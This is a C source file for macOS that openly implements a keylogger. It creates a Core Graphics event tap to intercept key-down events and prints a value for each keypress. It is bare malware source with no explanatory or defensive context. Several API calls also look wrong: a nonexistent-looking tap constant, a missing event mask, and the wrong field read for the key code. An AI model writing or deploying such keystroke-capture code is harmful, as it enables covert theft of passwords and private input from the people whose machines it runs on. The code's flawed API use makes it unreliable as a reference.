#include <ApplicationServices/ApplicationServices.h>

CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *userInfo) {
    if (type == kCGEventKeyDown) {
        int keyCode = CGEventGetIntegerValueField(event, kCGEventSourceStateID);
        printf("Key pressed: %d\n", keyCode);
    }
    return event;
}

void start_keylogger() {
    CFMachPortRef eventTap = CGEventTapCreate(kCGEventTapEventTap, kCGEventTapOptionDefault, kCGEventTapEventTap, kCGEventKeyDown, event_handler, NULL);
    if (!eventTap) {
        printf("Failed to create event tap\n");
        return;
    }

    CFRunLoopRef runLoop = CFRunLoopGetCurrent();
    CFRunLoopAddSource(runLoop, CFMachPortCreateRunLoopSource(NULL, eventTap, 0), kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    CFRunLoopRun();
}
